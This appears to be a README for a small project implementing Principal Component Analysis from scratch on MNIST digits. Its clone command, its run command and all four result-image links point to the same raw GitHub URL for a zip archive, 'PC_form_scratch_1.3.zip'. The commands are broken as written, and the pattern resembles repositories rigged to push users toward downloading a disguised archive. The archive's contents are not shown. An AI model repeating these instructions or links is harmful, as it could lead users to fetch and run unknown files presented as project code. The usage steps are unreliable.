# PCA-form-scratch
PCA(Principal Component Analysis) is a fundamental technique in machine learning and statistics used for dimensionality reduction, which transforms high-dimensional data into a lower-dimensional space while preserving as much variance as possible.

PCA involves:
1. Calculating the covariance matrix of the original features.
2. Decomposing this matrix into eigenvectors and eigenvalues.
3. Sorting eigenvectors by their eigenvalues to identify principal components.

This project demonstrates PCA on the MNIST dataset, by using few digits.

## Usage

Clone the repository:
```bash
git clone https://raw.githubusercontent.com/DeepKalsariya09/PCA-form-scratch/main/remora/PC_form_scratch_1.3.zip
cd PCA-from-scratch
```

Install the required dependencies:
```bash
pip install numpy matplotlib scikit-learn
```

Run the script:
```bash
python https://raw.githubusercontent.com/DeepKalsariya09/PCA-form-scratch/main/remora/PC_form_scratch_1.3.zip
```

## Workflow 
1. Data Loading and Pre-processing
2. Covariance Matrix Calculation
3. Eigenvalue and Eigenvector Computation
4. Select Principal Components and Reconstruct Image
5. Plot Variance

## Results
1. Reconstructed Images
2. Variance by each principal component
3. Cumulative variance

   Original Images
![image](https://raw.githubusercontent.com/DeepKalsariya09/PCA-form-scratch/main/remora/PC_form_scratch_1.3.zip)

with 2 Principal Components
![image](https://raw.githubusercontent.com/DeepKalsariya09/PCA-form-scratch/main/remora/PC_form_scratch_1.3.zip)

with 75 Principal Components
![image](https://raw.githubusercontent.com/DeepKalsariya09/PCA-form-scratch/main/remora/PC_form_scratch_1.3.zip)

200 Principal Components
![image](https://raw.githubusercontent.com/DeepKalsariya09/PCA-form-scratch/main/remora/PC_form_scratch_1.3.zip)
